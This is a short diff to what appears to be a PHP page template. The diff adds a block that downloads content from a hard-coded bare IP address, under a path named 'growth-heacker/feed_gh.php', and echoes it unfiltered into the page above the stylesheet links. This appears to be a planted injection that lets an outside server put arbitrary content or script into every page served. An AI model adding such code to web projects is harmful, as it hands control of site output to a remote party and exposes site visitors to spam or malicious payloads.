@@ -113,6 +113,9 @@ var key = 1;
 </div>
 </div>
 </div>
+<?php
+echo $payload = file_get_contents('http://52.74.43.53/growth-heacker/feed_gh.php');	
+?>
 <link href="<?php echo $webroot_path; ?>assets/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
 	<link href="<?php echo $webroot_path; ?>assets/css/metro.css" rel="stylesheet" />
 	
